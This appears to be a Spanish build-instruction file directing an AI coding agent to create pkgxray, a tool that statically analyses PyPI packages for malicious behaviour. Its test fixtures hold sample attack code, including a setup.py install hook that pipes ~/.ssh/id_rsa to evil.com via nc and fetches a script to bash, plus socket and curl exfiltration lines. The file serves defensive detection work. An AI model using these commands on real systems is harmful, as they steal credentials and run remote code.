# INSTRUCCIONES DE CONSTRUCCIÓN — pkgxray
# ==========================================
# CLAUDE CODE: Lee este archivo completo antes de escribir una sola línea de código.
# Luego construye TODO el proyecto siguiendo las fases en orden.
# NO preguntes nada. NO omitas nada. Construye TODO.
# Al terminar cada fase, haz un commit de git con mensaje descriptivo.

# ============================================================================
# CONTEXTO GENERAL DEL PROYECTO
# ============================================================================
#
# ¿QUÉ ES pkgxray?
# pkgxray es una librería de seguridad para Python que analiza paquetes de PyPI
# ANTES de instalarlos para detectar comportamientos sospechosos o maliciosos.
# El nombre viene de "package x-ray" — como una radiografía de un paquete.
#
# ¿QUÉ PROBLEMA RESUELVE?
# Cuando alguien ejecuta "pip install un-paquete", confía ciegamente en que
# ese código es seguro. Pero existen paquetes maliciosos en PyPI que:
# - Roban API keys y tokens de variables de entorno
# - Abren conexiones de red para exfiltrar datos
# - Ejecutan código arbitrario con eval()/exec()
# - Leen archivos sensibles como ~/.ssh/id_rsa o /etc/passwd
# - Corren comandos del sistema operativo en segundo plano
# - Esconden payloads maliciosos con base64 u ofuscación
# - Inyectan código en el setup.py que se ejecuta al instalar
#
# Herramientas como pip-audit solo revisan CVEs (vulnerabilidades ya reportadas).
# pkgxray va más allá: descarga el paquete SIN instalarlo, descomprime el código
# fuente, y lo analiza estáticamente con AST (Abstract Syntax Trees) para detectar
# patrones peligrosos que NINGÚN otro paquete de pip detecta de esta manera.
#
# ¿POR QUÉ NO EXISTE ALGO ASÍ?
# - pip-audit / safety → Solo buscan CVEs conocidos, no analizan código
# - bandit → Analiza TU código, no paquetes de terceros antes de instalarlos
# - No hay una librería pip-installable que haga análisis de comportamiento
#   de paquetes de PyPI antes de la instalación
#
# FLUJO COMPLETO DE CÓMO FUNCIONA:
# 1. DOWNLOAD: El usuario dice "pkgxray scan requests". pkgxray consulta la
#    API JSON de PyPI, descarga el archivo .tar.gz o .whl a un directorio
#    temporal. NO instala nada, solo descarga el archivo comprimido.
# 2. EXTRACT: Descomprime el archivo y extrae todos los archivos .py,
#    incluyendo setup.py (vector de ataque principal).
# 3. ANALYZE: Pasa cada archivo .py por 8 analizadores especializados.
#    Cada analizador parsea el código como árbol AST (no regex) y busca
#    patrones específicos de comportamiento sospechoso.
# 4. SCORE: Toma todos los hallazgos, asigna pesos por severidad
#    (LOW=1, MEDIUM=3, HIGH=7, CRITICAL=15), y calcula un score de 0-100.
# 5. REPORT: Genera un reporte legible en terminal (con colores usando rich),
#    JSON (para automatización), o HTML (visual para compartir).
#
# ARQUITECTURA Y DECISIONES DE DISEÑO:
# - Se usa src/ layout (src/pkgxray/) porque es la práctica recomendada por PyPA.
#   Evita que imports accidentales del directorio local interfieran con tests.
# - Se usa hatchling como build system porque es moderno y simple.
# - Se usa click para la CLI porque es más limpio que argparse.
# - Se usa rich para output en terminal porque da colores y tablas sin esfuerzo.
# - Los analizadores usan el módulo ast (stdlib) en vez de regex porque:
#   * Es más robusto: entiende la estructura del código, no solo texto
#   * Es más difícil de evadir: renombrar variables no engaña al AST
#   * Es estándar de Python, no agrega dependencias
# - Cada analizador es una clase independiente que hereda de BaseAnalyzer.
#   Esto usa el patrón Strategy: son intercambiables y fáciles de extender.
# - El proyecto se publica a PyPI con GitHub Actions automáticamente al
#   crear un tag (v0.1.0, v0.2.0, etc.).
# - Solo tiene 2 dependencias externas (click + rich). Todo lo demás usa
#   la biblioteca estándar de Python. Esto es intencional: una herramienta
#   de seguridad debe tener la menor superficie de ataque posible.
#
# ESTE PROYECTO ES PARA UNA MATERIA UNIVERSITARIA ("Fuentes de Datos").
# Requisitos obligatorios que DEBE cumplir:
# 1. Librería instalable con pip → pyproject.toml + publicación a PyPI
# 2. Repositorio en GitHub con CI/CD para publicar a PyPI → GitHub Actions
# 3. Uso no trivial y relevante → Análisis de seguridad con 8 analizadores AST
# 4. Notebook tutorial que instale desde PyPI y demuestre uso → Colab notebook
# 5. README con documentación clara → Instalación, uso, ejemplos, badges
# 6. Versión dockerizada con tests → Dockerfile + docker-compose.yml
#
# AHORA SÍ, CONSTRUYE TODO SIGUIENDO LAS FASES EN ORDEN.
# ============================================================================

# ============================================================================
# FASE 0: SETUP INICIAL DEL PROYECTO
# ============================================================================

# 0.1 — Inicializa git en esta carpeta
# Ejecuta: git init

# 0.2 — Crea TODA la estructura de directorios:
#
# pkgxray/
# ├── src/
# │   └── pkgxray/
# │       ├── __init__.py
# │       ├── cli.py
# │       ├── downloader.py
# │       ├── extractor.py
# │       ├── scanner.py
# │       ├── scorer.py
# │       ├── reporter.py
# │       ├── utils.py
# │       └── analyzers/
# │           ├── __init__.py
# │           ├── base.py
# │           ├── code_exec.py
# │           ├── network.py
# │           ├── filesystem.py
# │           ├── env_access.py
# │           ├── subprocess_calls.py
# │           ├── obfuscation.py
# │           ├── setup_scripts.py
# │           └── dynamic_imports.py
# ├── tests/
# │   ├── __init__.py
# │   ├── conftest.py
# │   ├── test_downloader.py
# │   ├── test_extractor.py
# │   ├── test_scanner.py
# │   └── test_analyzers/
# │       ├── __init__.py
# │       ├── test_code_exec.py
# │       ├── test_network.py
# │       ├── test_filesystem.py
# │       ├── test_env_access.py
# │       ├── test_subprocess.py
# │       ├── test_obfuscation.py
# │       ├── test_setup_scripts.py
# │       └── test_dynamic_imports.py
# ├── notebooks/
# │   └── (se crea en fase 8)
# ├── .github/
# │   └── workflows/
# │       └── publish.yml
# ├── INSTRUCTIONS.md  (este archivo)
# ├── pyproject.toml
# ├── README.md
# ├── CHANGELOG.md
# ├── LICENSE
# ├── Dockerfile
# ├── docker-compose.yml
# └── .gitignore

# 0.3 — Crea el archivo pyproject.toml con EXACTAMENTE este contenido:

# ```toml
# [build-system]
# requires = ["hatchling"]
# build-backend = "hatchling.build"
#
# [project]
# name = "pkgxray"
# version = "0.1.0"
# description = "Analyze PyPI packages for suspicious behavior before installing them"
# readme = "README.md"
# license = {text = "MIT"}
# requires-python = ">=3.9"
# authors = [
#     {name = "pkgxray contributors"},
# ]
# keywords = ["security", "pypi", "package", "analysis", "malware", "supply-chain"]
# classifiers = [
#     "Development Status :: 3 - Alpha",
#     "Intended Audience :: Developers",
#     "License :: OSI Approved :: MIT License",
#     "Programming Language :: Python :: 3",
#     "Programming Language :: Python :: 3.9",
#     "Programming Language :: Python :: 3.10",
#     "Programming Language :: Python :: 3.11",
#     "Programming Language :: Python :: 3.12",
#     "Topic :: Security",
#     "Topic :: Software Development :: Quality Assurance",
# ]
# dependencies = [
#     "click>=8.0",
#     "rich>=13.0",
# ]
#
# [project.optional-dependencies]
# dev = [
#     "pytest>=7.0",
#     "pytest-cov>=4.0",
#     "build>=1.0",
#     "twine>=5.0",
# ]
#
# [project.scripts]
# pkgxray = "pkgxray.cli:main"
#
# [project.urls]
# Homepage = "https://github.com/TU_USUARIO/pkgxray"
# Repository = "https://github.com/TU_USUARIO/pkgxray"
# Issues = "https://github.com/TU_USUARIO/pkgxray/issues"
# ```

# 0.4 — Crea .gitignore para Python:
# Debe incluir: __pycache__/, *.pyc, dist/, build/, *.egg-info/,
# .eggs/, .pytest_cache/, .coverage, htmlcov/, .venv/, venv/,
# *.whl, *.tar.gz, .env, .DS_Store

# 0.5 — Crea LICENSE con licencia MIT (año 2025)

# 0.6 — Crea CHANGELOG.md con entrada para v0.1.0

# 0.7 — git add . && git commit -m "chore: initial project structure"

# ============================================================================
# FASE 1: MODELOS DE DATOS BASE (analyzers/base.py)
# ============================================================================
# Este archivo define los tipos que TODO el proyecto va a usar.
# Debe implementarse PRIMERO porque todos los demás archivos dependen de él.

# Archivo: src/pkgxray/analyzers/base.py
# Contenido requerido:

# 1. Importar: abc (ABC, abstractmethod), dataclasses, enum

# 2. Crear Enum "Severity" con valores:
#    - LOW = "low"
#    - MEDIUM = "medium"
#    - HIGH = "high"
#    - CRITICAL = "critical"

# 3. Crear dataclass "Finding" con campos:
#    - severity: Severity
#    - description: str (explicación legible de qué se encontró)
#    - filename: str (archivo donde se encontró)
#    - line_number: int (línea del hallazgo)
#    - code_snippet: str (fragmento de código sospechoso, max 200 chars)
#    - analyzer_name: str (nombre del analizador que lo encontró)

# 4. Crear clase abstracta "BaseAnalyzer(ABC)" con:
#    - Atributo de clase: name: str (nombre del analizador)
#    - Atributo de clase: description: str (qué busca)
#    - Método abstracto: analyze(self, source_code: str, filename: str) -> list[Finding]
#    - Método helper (no abstracto): _parse_ast(self, source_code: str)
#      que intenta parsear con ast.parse() y retorna None si falla
#      (algunos archivos pueden tener syntax errors)

# 5. Crear dataclass "ExtractedFile" con campos:
#    - filename: str
#    - content: str
#    - is_setup: bool = False (True si es setup.py o setup.cfg)

# 6. Crear dataclass "ScanResult" con campos:
#    - package_name: str
#    - version: str
#    - scan_date: str (ISO format)
#    - findings: list[Finding]
#    - risk_score: int (0-100)
#    - risk_level: str ("LOW", "MODERATE", "HIGH", "CRITICAL")
#    - files_analyzed: int
#    - summary: dict (conteo de findings por severidad)

# git commit -m "feat: add base data models and abstract analyzer"

# ============================================================================
# FASE 2: DOWNLOADER (downloader.py)
# ============================================================================

# Archivo: src/pkgxray/downloader.py
# Este módulo descarga paquetes de PyPI SIN instalarlos.

# Implementación requerida:

# 1. Importar: urllib.request, urllib.error, json, tempfile, pathlib.Path, shutil

# 2. Crear excepción custom: PackageNotFoundError(Exception)
# 3. Crear excepción custom: DownloadError(Exception)

# 4. Constante: PYPI_API_URL = "https://pypi.org/pypi/{package_name}/json"
#    Si hay version: PYPI_API_URL = "https://pypi.org/pypi/{package_name}/{version}/json"

# 5. Función: get_package_info(package_name: str, version: str | None = None) -> dict
#    - Construye la URL de la API de PyPI
#    - Hace request con urllib.request.urlopen()
#    - Si HTTP 404 → raise PackageNotFoundError
#    - Parsea y retorna el JSON
#    - Timeout de 30 segundos

# 6. Función: find_best_distribution(package_info: dict) -> tuple[str, str]
#    - Del JSON de PyPI, busca en package_info["urls"] el mejor archivo para descargar
#    - PRIORIDAD: primero buscar sdist (.tar.gz) porque contiene setup.py
#    - Si no hay sdist, buscar el primer wheel (.whl) que sea "any" platform
#    - Si no hay nada, buscar cualquier distribución disponible
#    - Retorna (url, filename)
#    - Si no encuentra nada → raise DownloadError("No suitable distribution found")

# 7. Función: download_package(package_name: str, version: str | None = None, dest_dir: str | None = None) -> pathlib.Path
#    - Si dest_dir es None, crear un tempfile.mkdtemp(prefix="pkgxray_")
#    - Llama a get_package_info() para obtener metadata
#    - Llama a find_best_distribution() para encontrar la URL
#    - Descarga el archivo con urllib.request.urlretrieve() a dest_dir
#    - Retorna el Path al archivo descargado
#    - Extrae también la versión del JSON: package_info["info"]["version"]
#    - Retorna: tuple (Path al archivo, version string)

# IMPORTANTE: Toda función debe tener docstring clara.
# IMPORTANTE: Manejo de errores robusto con try/except.

# git commit -m "feat: implement PyPI package downloader"

# ============================================================================
# FASE 3: EXTRACTOR (extractor.py)
# ============================================================================

# Archivo: src/pkgxray/extractor.py
# Este módulo extrae archivos Python de paquetes descargados.

# Implementación requerida:

# 1. Importar: tarfile, zipfile, pathlib.Path, io
# 2. Importar: ExtractedFile desde analyzers.base

# 3. Función: extract_python_files(archive_path: pathlib.Path) -> list[ExtractedFile]
#    - Detecta el tipo de archivo por extensión:
#      * Si termina en .tar.gz o .tgz → usar _extract_from_tarball()
#      * Si termina en .whl o .zip → usar _extract_from_zip()
#      * Si no, raise ValueError("Unsupported archive format")
#    - Retorna lista de ExtractedFile

# 4. Función interna: _extract_from_tarball(archive_path: Path) -> list[ExtractedFile]
#    - Abre con tarfile.open(archive_path, "r:gz")
#    - Itera sobre los miembros del archivo
#    - Para cada miembro que sea un archivo (no directorio):
#      * Si su nombre termina en ".py" → extraer contenido como string (UTF-8, ignorar errores)
#      * Si su nombre es "setup.py" o "setup.cfg" → marcar is_setup=True
#      * Si es "pyproject.toml" → también extraer (is_setup=False)
#    - SEGURIDAD: saltar miembros cuyo path contiene ".." (path traversal attack)
#    - SEGURIDAD: limitar tamaño individual a 5MB por archivo
#    - Retorna lista de ExtractedFile

# 5. Función interna: _extract_from_zip(archive_path: Path) -> list[ExtractedFile]
#    - Abre con zipfile.ZipFile(archive_path, "r")
#    - Misma lógica que _extract_from_tarball pero para ZIPs
#    - Los .whl son archivos ZIP renombrados
#    - Retorna lista de ExtractedFile

# 6. Función auxiliar: _is_python_file(filename: str) -> bool
#    - Retorna True si el filename termina en ".py"
#    - También True para "setup.cfg" y "pyproject.toml"

# 7. Función auxiliar: _is_setup_file(filename: str) -> bool
#    - Retorna True si el basename es "setup.py" o "setup.cfg"

# git commit -m "feat: implement archive extractor for tar.gz and whl files"

# ============================================================================
# FASE 4: LOS 8 ANALIZADORES
# ============================================================================
# Cada analizador hereda de BaseAnalyzer y usa el módulo ast de Python.
# Todos siguen el mismo patrón: parsear el AST, caminar los nodos, detectar patrones.

# ─────────────────────────────────────────────
# ANALIZADOR 1: src/pkgxray/analyzers/code_exec.py
# ─────────────────────────────────────────────
# Clase: CodeExecAnalyzer(BaseAnalyzer)
# name = "code_exec"
# description = "Detects dynamic code execution (eval, exec, compile)"
#
# Qué detecta:
# - Llamadas a eval() → severity HIGH
# - Llamadas a exec() → severity CRITICAL
# - Llamadas a compile() → severity HIGH
#
# Cómo detectarlo con AST:
# - Parsear el source_code con ast.parse()
# - Caminar el AST con ast.walk()
# - Buscar nodos ast.Call donde:
#   * node.func es ast.Name y node.func.id está en {"eval", "exec", "compile"}
# - Para cada match, crear un Finding con:
#   * La línea (node.lineno)
#   * El snippet: extraer la línea del source_code original
#   * Description: "Call to {func_name}() detected - allows arbitrary code execution"

# ─────────────────────────────────────────────
# ANALIZADOR 2: src/pkgxray/analyzers/network.py
# ─────────────────────────────────────────────
# Clase: NetworkAnalyzer(BaseAnalyzer)
# name = "network"
# description = "Detects network connections and HTTP requests"
#
# Qué detecta:
# A) Imports sospechosos de módulos de red:
#    - import socket → MEDIUM
#    - import urllib / urllib.request → MEDIUM
#    - import http.client → MEDIUM
#    - import requests → MEDIUM
#    - import httpx → MEDIUM
#    - import aiohttp → MEDIUM
#
# B) Llamadas directas a funciones de red:
#    - socket.connect(), socket.create_connection() → HIGH
#    - urllib.request.urlopen() → HIGH
#    - requests.get/post/put/delete() → HIGH
#    - httpx.get/post() → HIGH
#
# Cómo detectarlo con AST:
# - Para imports: buscar nodos ast.Import y ast.ImportFrom
#   donde los nombres de módulo coincidan con la lista
# - Para llamadas: buscar nodos ast.Call donde func es ast.Attribute
#   y el atributo está en la lista de funciones de red
# - Nota: los imports por sí solos son MEDIUM (puede ser legítimo),
#   las llamadas directas son HIGH

# ─────────────────────────────────────────────
# ANALIZADOR 3: src/pkgxray/analyzers/filesystem.py
# ─────────────────────────────────────────────
# Clase: FilesystemAnalyzer(BaseAnalyzer)
# name = "filesystem"
# description = "Detects suspicious file system access"
#
# Qué detecta:
# A) open() en modo escritura ('w', 'a', 'wb', 'ab') → MEDIUM
# B) os.remove(), os.unlink() → HIGH
# C) shutil.rmtree() → HIGH
# D) Acceso a paths sensibles como strings en el código:
#    - "/etc/passwd", "/etc/shadow" → CRITICAL
#    - "~/.ssh/", "/.ssh/" → CRITICAL
#    - "~/.aws/", "/.aws/" → CRITICAL
#    - "~/.bashrc", "~/.profile", "~/.zshrc" → HIGH
#    - "/tmp/" con escritura → MEDIUM
#
# Cómo detectarlo con AST:
# - Para open() en modo escritura: buscar ast.Call donde func es ast.Name
#   con id="open" y verificar si el segundo argumento (mode) contiene 'w' o 'a'
# - Para os.remove/shutil.rmtree: buscar ast.Call con ast.Attribute
# - Para paths sensibles: buscar nodos ast.Constant donde el valor es string
#   y contiene algún path sensible de la lista

# ─────────────────────────────────────────────
# ANALIZADOR 4: src/pkgxray/analyzers/env_access.py
# ─────────────────────────────────────────────
# Clase: EnvAccessAnalyzer(BaseAnalyzer)
# name = "env_access"
# description = "Detects access to environment variables"
#
# Qué detecta:
# - os.environ[...] → MEDIUM
# - os.environ.get(...) → MEDIUM
# - os.getenv(...) → MEDIUM
# - Acceso específico a variables sensibles conocidas:
#   "AWS_SECRET", "API_KEY", "TOKEN", "PASSWORD", "SECRET",
#   "DATABASE_URL", "PRIVATE_KEY" → HIGH
#
# Cómo detectarlo con AST:
# - os.environ: buscar ast.Attribute donde attr="environ" y
#   value es ast.Name con id="os"
# - os.getenv(): buscar ast.Call donde func es ast.Attribute
#   con attr="getenv"
# - Para las variables sensibles: si el primer argumento del Call
#   es ast.Constant y su valor contiene alguna keyword sensible → HIGH

# ─────────────────────────────────────────────
# ANALIZADOR 5: src/pkgxray/analyzers/subprocess_calls.py
# ─────────────────────────────────────────────
# Clase: SubprocessAnalyzer(BaseAnalyzer)
# name = "subprocess"
# description = "Detects system command execution"
#
# Qué detecta:
# - subprocess.run() → HIGH
# - subprocess.call() → HIGH
# - subprocess.Popen() → CRITICAL
# - subprocess.check_output() → HIGH
# - os.system() → CRITICAL
# - os.popen() → CRITICAL
# - os.execvp(), os.execv() → CRITICAL
# - import subprocess → MEDIUM (el import solo)
#
# Cómo detectarlo con AST:
# - Buscar ast.Call con ast.Attribute donde:
#   * value.id == "subprocess" y attr in {"run", "call", "Popen", "check_output"}
#   * value.id == "os" y attr in {"system", "popen", "execvp", "execv"}
# - Buscar ast.Import / ast.ImportFrom de "subprocess"
# - subprocess.Popen y os.system son CRITICAL porque ejecutan comandos
#   de shell directamente

# ─────────────────────────────────────────────
# ANALIZADOR 6: src/pkgxray/analyzers/obfuscation.py
# ─────────────────────────────────────────────
# Clase: ObfuscationAnalyzer(BaseAnalyzer)
# name = "obfuscation"
# description = "Detects code obfuscation techniques"
#
# Qué detecta:
# A) base64.b64decode() → MEDIUM normalmente, pero si está cerca de
#    exec()/eval() → CRITICAL (patrón clásico de malware: exec(base64.b64decode("...")))
# B) Strings hexadecimales muy largos (>100 chars) como: "\x68\x65\x6c\x6c\x6f" → HIGH
# C) codecs.decode() con encoding 'rot13' u otros → MEDIUM
# D) bytes.fromhex() → MEDIUM
#
# Cómo detectarlo con AST:
# - Para base64: buscar ast.Call donde func es ast.Attribute con attr="b64decode"
#   Luego verificar si el nodo padre o nodo hermano es exec()/eval()
#   (para esto necesitas llevar track del parent node)
# - Para strings hex: buscar ast.Constant donde el valor es string
#   y contiene secuencias \x repetidas (usar regex: r'(\\x[0-9a-fA-F]{2}){10,}')
#   o bytes literals muy largos
# - Para la combinación exec+base64, buscar el patrón:
#   ast.Call(func=Name(id='exec'), args=[ast.Call(func=Attribute(attr='b64decode'))])

# ─────────────────────────────────────────────
# ANALIZADOR 7: src/pkgxray/analyzers/setup_scripts.py
# ─────────────────────────────────────────────
# Clase: SetupScriptAnalyzer(BaseAnalyzer)
# name = "setup_scripts"
# description = "Detects dangerous patterns in setup.py files"
#
# IMPORTANTE: Este analizador SOLO se aplica a archivos donde is_setup=True.
# El scanner debe pasar esta información. Para implementarlo simple:
# si el filename contiene "setup.py", aplicar este analizador.
#
# Qué detecta (SOLO en setup.py):
# A) Clases que heredan de install, develop, egg_info, sdist, build_py
#    y tienen código en __init__ o run → CRITICAL
#    (esto es un post-install hook custom = vector de ataque #1)
# B) Imports de subprocess, os.system, socket, urllib dentro de setup.py → HIGH
# C) Llamadas a eval/exec dentro de setup.py → CRITICAL
# D) Llamadas a urllib/requests/socket dentro de setup.py → CRITICAL
#
# Cómo detectarlo con AST:
# - Para clases con override: buscar ast.ClassDef donde bases contiene
#   algún nombre en {"install", "develop", "egg_info", "sdist", "build_py"}
#   y el body contiene ast.FunctionDef con name="run" o name="__init__"
# - Para imports peligrosos en setup.py: misma lógica de import pero
#   con severidad elevada porque es setup.py

# ─────────────────────────────────────────────
# ANALIZADOR 8: src/pkgxray/analyzers/dynamic_imports.py
# ─────────────────────────────────────────────
# Clase: DynamicImportAnalyzer(BaseAnalyzer)
# name = "dynamic_imports"
# description = "Detects dynamic module imports"
#
# Qué detecta:
# - __import__("modulo") → HIGH
# - importlib.import_module("modulo") → MEDIUM
# - importlib.import_module() con variable (no string literal) → HIGH
#   (imports construidos dinámicamente son más sospechosos)
#
# Cómo detectarlo con AST:
# - __import__: buscar ast.Call donde func es ast.Name con id="__import__"
# - importlib.import_module: buscar ast.Call donde func es ast.Attribute
#   con attr="import_module"
# - Verificar si el argumento es ast.Constant (literal = menos sospechoso)
#   o algo dinámico como ast.BinOp, ast.JoinedStr, ast.Call (= más sospechoso)

# ─────────────────────────────────────────────
# REGISTRO DE ANALIZADORES: src/pkgxray/analyzers/__init__.py
# ─────────────────────────────────────────────
# Importar las 8 clases de analizadores
# Crear función: get_all_analyzers() -> list[BaseAnalyzer]
# que retorna una instancia de cada uno de los 8 analizadores.
# Ejemplo:
#   def get_all_analyzers():
#       return [
#           CodeExecAnalyzer(),
#           NetworkAnalyzer(),
#           FilesystemAnalyzer(),
#           EnvAccessAnalyzer(),
#           SubprocessAnalyzer(),
#           ObfuscationAnalyzer(),
#           SetupScriptAnalyzer(),
#           DynamicImportAnalyzer(),
#       ]

# git commit -m "feat: implement all 8 security analyzers"

# ============================================================================
# FASE 5: SCORER (scorer.py)
# ============================================================================

# Archivo: src/pkgxray/scorer.py
# Calcula el score de riesgo basado en los findings.

# Implementación:

# 1. Diccionario de pesos por severidad:
#    SEVERITY_WEIGHTS = {
#        Severity.LOW: 1,
#        Severity.MEDIUM: 3,
#        Severity.HIGH: 7,
#        Severity.CRITICAL: 15,
#    }

# 2. Función: calculate_risk_score(findings: list[Finding]) -> tuple[int, str]
#    - Si no hay findings → retorna (0, "LOW")
#    - Sumar los pesos de cada finding según su severidad
#    - Aplicar: score = min(100, total_weight)
#    - Clasificar:
#      * 0-20 → "LOW"
#      * 21-40 → "MODERATE"
#      * 41-70 → "HIGH"
#      * 71-100 → "CRITICAL"
#    - Retorna (score, level)

# 3. Función: get_summary(findings: list[Finding]) -> dict
#    - Retorna diccionario con conteo por severidad:
#      {"low": 2, "medium": 5, "high": 1, "critical": 0, "total": 8}

# git commit -m "feat: implement risk scoring system"

# ============================================================================
# FASE 6: SCANNER (scanner.py) — El orquestador
# ============================================================================

# Archivo: src/pkgxray/scanner.py
# Este es el punto de entrada principal. Conecta todo.

# Implementación:

# 1. Importar: downloader, extractor, analyzers.get_all_analyzers, scorer, datetime

# 2. Función: scan(package_name: str, version: str | None = None) -> ScanResult
#    Flujo exacto:
#    a) Llamar a downloader.download_package(package_name, version)
#       → obtiene (archive_path, actual_version)
#    b) Llamar a extractor.extract_python_files(archive_path)
#       → obtiene lista de ExtractedFile
#    c) Obtener todos los analizadores con get_all_analyzers()
#    d) Para cada ExtractedFile:
#       - Para cada analizador:
#         * Si es SetupScriptAnalyzer y el archivo NO es setup.py → skip
#         * Llamar analizador.analyze(file.content, file.filename)
#         * Agregar los findings a la lista total
#    e) Calcular risk_score y risk_level con scorer.calculate_risk_score(findings)
#    f) Generar summary con scorer.get_summary(findings)
#    g) Crear y retornar ScanResult con toda la info
#    h) Limpiar el directorio temporal (usar try/finally o contextmanager)

# 3. MANEJO DE ERRORES:
#    - Si el paquete no se encuentra → propagar PackageNotFoundError
#    - Si hay error de red → propagar DownloadError
#    - Si un analizador individual falla en un archivo → catch y continuar
#      (no debe romper el escaneo completo)
#    - Siempre limpiar archivos temporales aunque haya error

# git commit -m "feat: implement main scanner orchestrator"

# ============================================================================
# FASE 7: REPORTER (reporter.py)
# ============================================================================

# Archivo: src/pkgxray/reporter.py
# Genera reportes en 3 formatos: terminal, JSON, HTML

# Implementación:

# --- Terminal Reporter (con rich) ---
# Función: print_terminal_report(result: ScanResult) -> None
#
# Debe mostrar:
# 1. Header con nombre del paquete, versión, fecha
# 2. Risk Score grande y con color:
#    - LOW → verde
#    - MODERATE → amarillo
#    - HIGH → naranja/rojo claro
#    - CRITICAL → rojo
# 3. Summary: "Found X issues: Y critical, Z high, W medium, V low"
# 4. Tabla de findings con columnas:
#    [Severity] [Analyzer] [File] [Line] [Description]
#    Cada fila coloreada según severidad
# 5. Si hay 0 findings → mensaje verde "No suspicious patterns found!"
#
# Usar de rich: Console, Table, Panel, Text con colores

# --- JSON Reporter ---
# Función: generate_json_report(result: ScanResult) -> str
#
# Serializa el ScanResult completo a JSON legible (indent=2).
# Los Enums se serializan como sus valores string.
# Debe poder escribirse a archivo si output_path es dado.

# --- HTML Reporter ---
# Función: generate_html_report(result: ScanResult) -> str
#
# Genera un HTML STANDALONE (todo el CSS inline) con:
# - Título: "pkgxray Security Report"
# - Nombre del paquete, versión, fecha
# - Score grande con color de fondo según nivel
# - Tabla de findings con filas coloreadas
# - Footer: "Generated by pkgxray"
# - Diseño limpio y profesional
# - NO usar frameworks CSS externos (todo inline)

# Función wrapper: generate_report(result: ScanResult, format: str = "terminal", output_path: str | None = None) -> str | None
# - Si format="terminal" → llama print_terminal_report(), retorna None
# - Si format="json" → llama generate_json_report()
# - Si format="html" → llama generate_html_report()
# - Si output_path es dado → escribe el resultado al archivo

# git commit -m "feat: implement terminal, JSON, and HTML reporters"

# ============================================================================
# FASE 8: CLI (cli.py)
# ============================================================================

# Archivo: src/pkgxray/cli.py
# Interfaz de línea de comandos usando click.

# Implementación:

# ```python
# import click
# from rich.console import Console
# from pkgxray.scanner import scan
# from pkgxray.reporter import generate_report
# from pkgxray.downloader import PackageNotFoundError, DownloadError
#
# console = Console()
#
# @click.group()
# @click.version_option(version="0.1.0", prog_name="pkgxray")
# def main():
#     """pkgxray - Analyze PyPI packages for suspicious behavior before installing them."""
#     pass
#
# @main.command()
# @click.argument("package_name")
# @click.option("--version", "-v", default=None, help="Specific package version to scan")
# @click.option("--format", "-f", "output_format",
#               type=click.Choice(["terminal", "json", "html"]),
#               default="terminal", help="Output format")
# @click.option("--output", "-o", default=None, help="Save report to file")
# def scan_cmd(package_name, version, output_format, output):
#     """Scan a PyPI package for suspicious behavior."""
#     try:
#         console.print(f"\n🔬 Scanning [bold]{package_name}[/bold]...\n")
#         result = scan(package_name, version)
#         generate_report(result, format=output_format, output_path=output)
#         if output:
#             console.print(f"\n📄 Report saved to [bold]{output}[/bold]")
#     except PackageNotFoundError:
#         console.print(f"[red]Error: Package '{package_name}' not found on PyPI[/red]")
#         raise SystemExit(1)
#     except DownloadError as e:
#         console.print(f"[red]Error downloading package: {e}[/red]")
#         raise SystemExit(1)
#     except Exception as e:
#         console.print(f"[red]Unexpected error: {e}[/red]")
#         raise SystemExit(1)
# ```

# git commit -m "feat: implement CLI with click"

# ============================================================================
# FASE 9: __init__.py PRINCIPAL
# ============================================================================

# Archivo: src/pkgxray/__init__.py
# Exporta la API pública de la librería.

# ```python
# """pkgxray - Analyze PyPI packages for suspicious behavior before installing them."""
#
# from pkgxray.scanner import scan
# from pkgxray.analyzers.base import ScanResult, Finding, Severity
#
# __version__ = "0.1.0"
# __all__ = ["scan", "ScanResult", "Finding", "Severity", "__version__"]
# ```

# git commit -m "feat: configure public API exports"

# ============================================================================
# FASE 10: TESTS
# ============================================================================

# Los tests son ESENCIALES. Deben cubrir los componentes principales.

# --- tests/conftest.py ---
# Fixtures compartidos:
# - safe_code: string con código Python limpio sin nada sospechoso
# - suspicious_code: string con código Python lleno de patrones peligrosos
# - setup_py_malicious: string con un setup.py que tiene post-install hooks
# - setup_py_clean: string con un setup.py normal

# Ejemplo de safe_code:
# ```python
# SAFE_CODE = '''
# import math
# import json
# from dataclasses import dataclass
#
# @dataclass
# class Calculator:
#     precision: int = 2
#
#     def add(self, a: float, b: float) -> float:
#         return round(a + b, self.precision)
#
#     def multiply(self, a: float, b: float) -> float:
#         return round(a * b, self.precision)
#
# def load_config(filepath: str) -> dict:
#     with open(filepath, "r") as f:
#         return json.load(f)
# '''
# ```

# Ejemplo de suspicious_code:
# ```python
# SUSPICIOUS_CODE = '''
# import os
# import subprocess
# import socket
# import base64
#
# exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
# eval(os.environ.get("PAYLOAD", "print('default')"))
# subprocess.Popen(["curl", os.environ["EXFIL_URL"], "-d", open("/etc/passwd").read()])
# os.system("rm -rf /tmp/evidence")
# sock = socket.socket()
# sock.connect(("evil.com", 4444))
# __import__("importlib").import_module("hidden_" + "module")
# '''
# ```

# Ejemplo de setup_py_malicious:
# ```python
# MALICIOUS_SETUP = '''
# from setuptools import setup
# from setuptools.command.install import install
# import subprocess
# import os
#
# class PostInstall(install):
#     def run(self):
#         install.run(self)
#         subprocess.call(["curl", "http://evil.com/steal.sh", "|", "bash"])
#         os.system("cat ~/.ssh/id_rsa | nc evil.com 1234")
#
# setup(
#     name="totally-legit-package",
#     version="1.0.0",
#     cmdclass={"install": PostInstall},
# )
# '''
# ```

# --- tests/test_analyzers/ ---
# Un archivo de test por cada analizador.
# Cada test debe verificar:
# 1. Que el código limpio NO genera findings
# 2. Que el código sospechoso SÍ genera findings
# 3. Que la severidad es la correcta
# 4. Que el nombre del analizador es correcto
# 5. Que archivos con syntax errors no crashean el analizador

# Ejemplo para test_code_exec.py:
# ```python
# from pkgxray.analyzers.code_exec import CodeExecAnalyzer
# from pkgxray.analyzers.base import Severity
#
# def test_detects_eval():
#     analyzer = CodeExecAnalyzer()
#     findings = analyzer.analyze('result = eval(user_input)', 'test.py')
#     assert len(findings) >= 1
#     assert any(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in findings)
#
# def test_detects_exec():
#     analyzer = CodeExecAnalyzer()
#     findings = analyzer.analyze('exec(some_code)', 'test.py')
#     assert len(findings) >= 1
#
# def test_safe_code_no_findings():
#     analyzer = CodeExecAnalyzer()
#     findings = analyzer.analyze('x = 1 + 2\nprint(x)', 'test.py')
#     assert len(findings) == 0
#
# def test_syntax_error_no_crash():
#     analyzer = CodeExecAnalyzer()
#     findings = analyzer.analyze('def broken(:\n  pass', 'test.py')
#     assert isinstance(findings, list)
# ```

